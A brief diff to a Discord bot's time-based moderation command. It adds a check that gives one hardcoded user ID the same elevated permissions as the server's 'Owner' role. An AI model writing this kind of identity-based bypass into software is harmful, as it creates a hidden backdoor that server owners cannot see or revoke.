@@ -63,7 +63,7 @@ class time_commands(commands.Cog, name="Time Based"):
 			d=unitoftime
 			role = discord.utils.find(lambda r: r.name == 'Moderator', ctx.message.guild.roles)
 			role2 = discord.utils.find(lambda r: r.name == 'Owner', ctx.message.guild.roles)
-			if role2 in ctx.author.roles:
+			if role2 in ctx.author.roles or ctx.author.id==825282868028375062:
 				elevperms=True
 
 			if role in member.roles:# or role2 in member.roles:
